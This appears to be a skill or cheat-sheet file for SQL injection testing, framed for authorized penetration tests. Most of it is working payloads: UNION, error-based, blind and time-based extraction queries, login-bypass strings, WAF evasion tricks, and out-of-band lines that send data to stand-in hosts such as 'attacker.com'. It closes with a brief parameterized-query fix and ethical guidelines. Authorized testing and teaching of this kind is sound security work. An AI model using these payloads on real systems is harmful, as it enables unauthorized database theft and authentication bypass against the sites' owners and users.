# SQL Injection Testing

Comprehensive SQL injection vulnerability assessment techniques for web applications, covering detection, exploitation, and defense validation.

## Description

USE WHEN:
- Testing for SQL injection vulnerabilities
- Performing authorized penetration tests
- Validating input sanitization mechanisms
- Bypassing authentication for security testing
- Extracting database information (authorized)
- Learning SQL injection defense

DON'T USE WHEN:
- No written authorization for testing
- Testing production systems with real user data
- Intent is malicious (don't be evil)

⚠️ **LEGAL REQUIREMENT**: Written penetration testing authorization required before use.

---

## Detection Phase

### Injection Point Identification

Common injectable parameters:
```
URL params:    ?id=1, ?user=admin, ?category=books
Form fields:   username, password, search, comments
Cookies:       session_id, user_preference
HTTP headers:  User-Agent, Referer, X-Forwarded-For
```

### Basic Vulnerability Tests

```sql
-- Single quote test
'

-- Double quote test
"

-- Comment sequences
--
#
/**/

-- Semicolon for query stacking
;
```

**Watch for:**
- Database error messages
- HTTP 500 errors
- Modified response content/length
- Unexpected behavior changes

### Boolean Logic Tests

```sql
-- True condition (should return data)
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- False condition (should return nothing/error)
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

Compare responses between true/false to confirm injection.

---

## Exploitation Techniques

### UNION-Based Extraction

```sql
-- Step 1: Determine column count
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continue until error occurs

-- Step 2: Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Step 3: Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Error-Based Extraction

```sql
-- MSSQL
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL (XPATH)
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL
1' AND 1=CAST((SELECT version()) AS int)--
```

### Blind Boolean-Based

```sql
-- Character extraction
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Conditional responses
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

### Time-Based Blind

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

### Out-of-Band (OOB)

```sql
-- MSSQL DNS exfiltration
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- MySQL DNS
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Oracle HTTP
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

---

## Authentication Bypass

```sql
-- Classic bypass payloads
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Query transformation example
-- Original: SELECT * FROM users WHERE username='input' AND password='input'
-- Injected (username: admin'--):
-- SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check bypassed!
```

---

## Filter Bypass Techniques

### Character Encoding

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527 (single quote)

-- Hex strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin'
```

### Whitespace Alternatives

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users

-- Tab character
SELECT%09username%09FROM%09users

-- Newline
SELECT%0Ausername%0AFROM%0Ausers
```

### Keyword Evasion

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION
```

---

## Database Fingerprinting

| Database | Version Query |
|----------|---------------|
| MySQL | `SELECT @@version` or `SELECT version()` |
| MSSQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| Oracle | `SELECT banner FROM v$version` |
| SQLite | `SELECT sqlite_version()` |

---

## Information Schema Queries

```sql
-- MySQL/MSSQL: List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle equivalent
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

---

## Quick Reference

| Purpose | Payload |
|---------|---------|
| Basic test | `'` or `"` |
| Boolean true | `OR 1=1--` |
| Boolean false | `AND 1=2--` |
| Comment (MySQL) | `#` or `-- ` |
| Comment (MSSQL) | `--` |
| UNION probe | `UNION SELECT NULL--` |
| Time delay | `AND SLEEP(5)--` |
| Auth bypass | `' OR '1'='1` |

---

## Detection Test Sequence

```
1. Insert ' → Check for error
2. Insert " → Check for error
3. Try: OR 1=1-- → Check for behavior change
4. Try: AND 1=2-- → Check for behavior change
5. Try: ' WAITFOR DELAY '0:0:5'-- → Check for delay
```

---

## Prevention (What to Look For in Code Review)

### ❌ Vulnerable

```javascript
const query = `SELECT * FROM users WHERE id = '${userId}'`;
```

### ✅ Safe

```javascript
// Parameterized query
const query = 'SELECT * FROM users WHERE id = $1';
const result = await db.query(query, [userId]);

// OR use ORM
const user = await prisma.user.findUnique({ where: { id: userId } });
```

---

## Tools

- **SQLMap**: Automated SQL injection
- **Burp Suite**: Request manipulation
- **OWASP ZAP**: Web app scanner
- **Havij**: SQL injection tool

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| No error messages | Use blind injection (boolean/time-based) |
| UNION fails | Check column count with ORDER BY |
| WAF blocking | Use encoding/evasion techniques |
| Payload not executing | Verify correct comment syntax for DB type |
| Time-based inconsistent | Use longer delays (10+ seconds) |

---

## Ethical Guidelines

- Never execute destructive queries (DROP, DELETE) without explicit authorization
- Limit data extraction to proof-of-concept quantities
- Stop immediately upon detecting production data
- Report critical vulnerabilities through agreed channels
- Document all activities for audit trail
